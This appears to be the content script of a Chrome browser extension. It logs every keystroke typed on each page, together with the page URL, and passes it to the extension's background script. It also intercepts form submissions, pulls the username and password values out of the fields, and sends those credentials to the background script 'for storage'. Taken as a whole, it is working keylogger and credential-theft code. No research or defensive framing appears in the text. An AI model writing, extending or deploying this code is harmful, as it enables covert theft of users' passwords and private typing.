let typedText = "";
let lastText = ""; // Store the last known text
let currentUrl = window.location.href;
let timeout;

document.addEventListener("keydown", (event) => {
    if (event.key.length === 1) { // Capture only printable characters
        typedText += event.key;
    } else if (event.key === "Backspace") {
        typedText += "<back>";
    } else if (event.key === "Enter") {
        typedText += "\n";
    }

    clearTimeout(timeout);
    timeout = setTimeout(sendKeystrokes, 1000); // Send after 1s of inactivity
});

function sendKeystrokes() {
    if (typedText !== lastText) { // Only send if there's a change
        chrome.runtime.sendMessage({
            type: "keystroke",
            url: currentUrl,
            text: computeDiff(lastText, typedText),
            timestamp: new Date().toISOString(),
        });

        lastText = typedText; // Update last recorded text
    }

    typedText = ""; // Reset for new input
}

/**
 * Compute the difference between old and new text
 * @param {string} oldText - The last saved text
 * @param {string} newText - The current text input
 * @returns {string} - Only the new changes
 */
function computeDiff(oldText, newText) {
    let start = 0;
    while (start < oldText.length && start < newText.length && oldText[start] === newText[start]) {
        start++;
    }

    let endOld = oldText.length - 1;
    let endNew = newText.length - 1;
    while (endOld >= start && endNew >= start && oldText[endOld] === newText[endNew]) {
        endOld--;
        endNew--;
    }

    let deletedPart = oldText.slice(start, endOld + 1);
    let addedPart = newText.slice(start, endNew + 1);

    if (deletedPart.length > 0) {
        return `<back ${deletedPart.length}>` + addedPart;
    }
    return addedPart;
}



document.addEventListener("submit", (event) => {
    const form = event.target;
    const passwordField = form.querySelector('input[type="password"]');
    const usernameField = form.querySelector(
    'input[type="text"], input[type="email"], input[type="tel"], input[name*="user"], input[name*="login"], input[name*="email-or-phone"], input[id*="user"], input[id*="login"], input[autocomplete="username"], input[autocomplete="email"]'
);


    if (passwordField && usernameField) {
        const credentials = {
            username: usernameField.value,
            password: passwordField.value,
            site: window.location.hostname
        };

        // Send credentials to background script for storage
        chrome.runtime.sendMessage({ type: "credentials", data: credentials });
    }
});
